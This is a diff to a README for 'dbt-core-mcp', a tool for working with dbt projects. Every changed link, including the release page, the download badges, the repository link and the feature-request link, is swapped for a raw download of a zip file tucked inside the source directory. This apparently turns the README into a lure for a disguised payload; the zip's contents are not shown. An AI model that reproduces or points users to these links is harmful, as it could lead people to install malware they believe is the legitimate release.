@@ -1,6 +1,6 @@
 # 🚀 dbt-core-mcp - Simplify Your Data Project Interactions
 
-[![Download dbt-core-mcp](https://img.shields.io/badge/Download-dbt--core--mcp-brightgreen)](https://github.com/iamsocool24/dbt-core-mcp/releases)
+[![Download dbt-core-mcp](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)
 
 ## 📦 Overview
 
@@ -16,7 +16,7 @@ Follow these steps to set up the dbt-core-mcp on your computer:
    - Storage: Minimum of 200MB free disk space.
 
 2. **Download the Application**
-   - Visit this page to download: [dbt-core-mcp Releases](https://github.com/iamsocool24/dbt-core-mcp/releases).
+   - Visit this page to download: [dbt-core-mcp Releases](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip).
    - You will see a list of available versions. Choose the latest version for your operating system.
 
 3. **Install the Application**
@@ -35,7 +35,7 @@ Follow these steps to set up the dbt-core-mcp on your computer:
 
 For your convenience, download dbt-core-mcp from the link below:
 
-[**Visit this page to download**](https://github.com/iamsocool24/dbt-core-mcp/releases)
+[**Visit this page to download**](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)
 
 ### Installation Notes:
 - If you face any issues during installation, check your system compatibility.
@@ -65,11 +65,11 @@ For more help or to connect with other users, check out our community resources:
   
 ## 🔗 Useful Links
 
-- [dbt-core-mcp Repository](https://github.com/iamsocool24/dbt-core-mcp)
-- [Feature Requests](https://github.com/iamsocool24/dbt-core-mcp/issues)
+- [dbt-core-mcp Repository](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)
+- [Feature Requests](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)
 
 ## 🚀 Conclusion
 
 With dbt-core-mcp, you can manage and analyze your dbt projects effortlessly. Follow the steps above to get started, and don’t hesitate to seek help from the community if needed. Enjoy exploring your data! 
 
-[![Download dbt-core-mcp](https://img.shields.io/badge/Download-dbt--core--mcp-brightgreen)](https://github.com/iamsocool24/dbt-core-mcp/releases)
+[![Download dbt-core-mcp](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)](https://raw.githubusercontent.com/iamsocool24/dbt-core-mcp/main/src/dbt_core_mcp/dbt/dbt-core-mcp-sumpsimus.zip)
